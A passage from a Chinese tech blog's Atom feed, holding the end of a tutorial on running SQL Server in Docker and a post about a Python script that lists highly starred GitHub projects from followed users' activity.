<h2 id="设置-宿主机保存数据目录-暂不支持"><a href="#设置-宿主机保存数据目录-暂不支持" class="headerlink" title="设置 宿主机保存数据目录(暂不支持)"></a>设置 宿主机保存数据目录(暂不支持)</h2><p><code>&lt;host directory&gt;</code> 为目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -v &lt;host directory&gt;:/var/opt/mssql -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure>
<h2 id="查看容器的ip-调试用"><a href="#查看容器的ip-调试用" class="headerlink" title="查看容器的ip(调试用)"></a>查看容器的ip(调试用)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker inspect --format=&apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; 容器id</div></pre></td></tr></table></figure>
<p>172.17.0.2</p>
<h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><p>用户名是SA</p>
<p>密码是用户自己设置的</p>
<p><img src="/content/images/sqldocker/1.jpg" alt=""></p>
<p>连接成功！</p>
<p><img src="/content/images/sqldocker/2.jpg" alt=""></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>内存占用情况</p>
<p><img src="/content/images/sqldocker/3.jpg" alt=""></p>
<p>我们一起默念<strong> 微软大法好 </strong> <strong> 微软大法好 </strong> <strong> 微软大法好 </strong> 。</p>
<p>谢谢微软为开源世界做的一切！</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker" target="_blank" rel="external">https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。&lt;/p&gt;
&lt;p&gt;Canonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」&lt;/p&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://blog.yfgeek.com/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://blog.yfgeek.com/tags/Docker/"/>
    
      <category term="SQLserver" scheme="http://blog.yfgeek.com/tags/SQLserver/"/>
    
  </entry>
  
  <entry>
    <title>当我关注3万Github用户后发生了什么</title>
    <link href="http://blog.yfgeek.com/2016/11/19/github3k/"/>
    <id>http://blog.yfgeek.com/2016/11/19/github3k/</id>
    <published>2016-11-19T11:36:26.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。</p>
<p>于是乎我利用这个关注了3万人的Github，可是关注后<del>除了同性交友</del>似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。<br><a id="more"></a><br><img src="/content/images/githubauto/1.jpg" alt=""></p>
<p>翻都翻不过来，那么同时还存在一些“无用( <del>垃圾</del> )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？</p>
<p>经过短暂的编码，<code>GithubAwesome.py</code>诞生了。</p>
<p>现在进入<a href="https://github.com/yfgeek/AutoGithub" target="_blank" rel="external">AutoGithub</a>项目就可以看到GithubAwesome.py项目</p>
<h1 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h1><p>设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。</p>
<p>举个🌰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">最少 star 数: 50</div><div class="line">最少 fork 数: 50</div></pre></td></tr></table></figure></p>
<p>效果如图</p>
<p><img src="/content/images/githubauto/awesomesnap.png" alt=""></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>首先，确保你安装了<code>beautifulsoup4</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install beautifulsoup4</div></pre></td></tr></table></figure>
<p>然后编辑<code>GithubAwesome.py</code>文件，请原谅如此土的方式。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ga = GithubAwesome(<span class="string">'username'</span>,<span class="string">'password'</span>)</div><div class="line"><span class="comment"># login</span></div><div class="line">ga.login()</div><div class="line">ga.get_awesome(<span class="number">1</span>,<span class="number">20</span>,<span class="number">50</span>) <span class="comment"># 第一页 规则 min star 20 min or fork 20</span></div></pre></td></tr></table></figure></p>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。&lt;/p&gt;
&lt;p&gt;于是乎我利用这个关注了3万人的Github，可是关注后&lt;del&gt;除了同性交友&lt;/del&gt;似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。&lt;br&gt;
    
    </summary>
    
      <category term="Github" scheme="http://blog.yfgeek.com/categories/Github/"/>
    
    
      <category term="Github" scheme="http://blog.yfgeek.com/tags/Github/"/>
    
  </entry>
  
</feed>
